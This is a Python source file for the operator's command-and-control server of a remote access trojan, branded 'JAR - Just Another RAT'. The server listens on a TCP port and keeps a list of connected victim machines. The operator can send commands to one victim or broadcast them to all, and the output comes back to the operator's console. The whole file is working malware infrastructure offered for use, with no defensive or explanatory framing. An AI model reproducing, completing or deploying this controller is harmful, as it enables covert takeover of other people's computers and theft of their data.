import socket
import threading
import os
import colorama
import time

def logo():
    print(colorama.Fore.CYAN + """
     ██╗ █████╗ ██████╗ 
     ██║██╔══██╗██╔══██╗
     ██║███████║██████╔╝
██   ██║██╔══██║██╔══██╗
╚█████╔╝██║  ██║██║  ██║
 ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
    """ + colorama.Fore.RESET)
    print(colorama.Fore.YELLOW + "JAR - Just Another RAT" + colorama.Fore.RESET)
    print(colorama.Fore.YELLOW + "By: Dylouwu" + colorama.Fore.RESET)
    print(colorama.Fore.YELLOW + "Version: 1.0" + colorama.Fore.RESET)


def handle_client(client_socket, address):
    with clients_lock:
        clients[address] = client_socket
    print(f"[+] Connection from {address} has been established.")
    
    while True:
        try:
            response = client_socket.recv(4096).decode('utf-8', errors='replace')
            if not response: # Client disconnected gracefully or sent empty data
                break
            print(f"\n{colorama.Fore.GREEN}[{address[0]}] Output {colorama.Fore.RESET}:\n{response}")
            
            global last_command_client_address
            if last_command_client_address == address:
                output_ready.set()
                last_command_client_address = None

        except (ConnectionResetError, BrokenPipeError):
            print(f"\n{colorama.Fore.RESET}[{colorama.Fore.RED}!{colorama.Fore.RESET}] Client {address[0]} has disconnected.")
            break
        except Exception as e:
            print(f"\n{colorama.Fore.RED}[!] Error handling client {address}: {e}{colorama.Fore.RESET}")
            break

    with clients_lock:
        if address in clients:
            del clients[address]
    client_socket.close()


def accept_clients(server):
    while True:
        try:
            client_socket, address = server.accept()
            client_handler = threading.Thread(target=handle_client, args=(client_socket, address), daemon=True)
            client_handler.start()
        except Exception as e:
            print(f"{colorama.Fore.RED}[!] Error accepting client: {e}{colorama.Fore.RESET}")
            break


def start_server(host="0.0.0.0", port=9999):
    colorama.init(autoreset=True)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)
    
    accept_thread = threading.Thread(target=accept_clients, args=(server,), daemon=True)
    accept_thread.start()
    
    os.system("cls" if os.name == "nt" else "clear")
    logo()
    print(f"[+] Listening on {host}:{port}")
    print(f"[{colorama.Fore.YELLOW}?{colorama.Fore.RESET}] Waiting for connections...\n")

    while True:
        time.sleep(0.1) 

        with clients_lock:
            current_clients = list(clients.keys())
        
        if not current_clients:
            time.sleep(1)
            continue

        print(f"\n{colorama.Fore.YELLOW}[{colorama.Fore.RESET}] Connected clients: {len(current_clients)}")
        for idx, address in enumerate(current_clients, start=1):
            print(f"{colorama.Fore.YELLOW}[{colorama.Fore.RESET}] {idx}. {address[0]}:{address[1]}")

        try:
            choice = int(input(f"{colorama.Fore.YELLOW}[{colorama.Fore.RESET}] Select a client number (or 0 to broadcast): "))
        except ValueError:
            print(f"{colorama.Fore.RED}[!] Invalid input. Please enter a number.{colorama.Fore.RESET}")
            continue

        command = ""
        client_to_send = None
        
        if choice == 0:
            command = input(f"{colorama.Fore.YELLOW}[{colorama.Fore.RESET}] Enter command to broadcast: ")
            with clients_lock: 
                for client_socket in clients.values():
                    try:
                        client_socket.sendall(command.encode('utf-8'))
                    except Exception as e:
                        print(f"{colorama.Fore.RED}[!] Error broadcasting to client: {e}{colorama.Fore.RESET}")
            continue 

        elif 1 <= choice <= len(current_clients):
            selected_address = current_clients[choice - 1]
            client_to_send = clients[selected_address]
            
            command = input(f"{colorama.Fore.YELLOW}[{colorama.Fore.RESET}] Enter command for {selected_address[0]}:{selected_address[1]}: ")
            
            global last_command_client_address
            last_command_client_address = selected_address
            output_ready.clear()
            
            try:
                client_to_send.sendall(command.encode('utf-8'))
                print(f"{colorama.Fore.BLUE}[*] Waiting for output from {selected_address[0]}...{colorama.Fore.RESET}", end='\r')
                output_ready.wait(timeout=10)
                
                if output_ready.is_set():
                    print(" " * 60, end='\r')
                else:
                    print(f"\n{colorama.Fore.RED}[!] Timeout: No output received from {selected_address[0]}.{colorama.Fore.RESET}")
                
            except Exception as e:
                print(f"{colorama.Fore.RED}[!] Error sending command or waiting for response: {e}{colorama.Fore.RESET}")

        else:
            print(f"{colorama.Fore.RED}[!] Invalid choice. Please select a valid client number.{colorama.Fore.RESET}")

if __name__ == "__main__":
    clients = {}
    clients_lock = threading.Lock()
    output_ready = threading.Event()
    start_server()
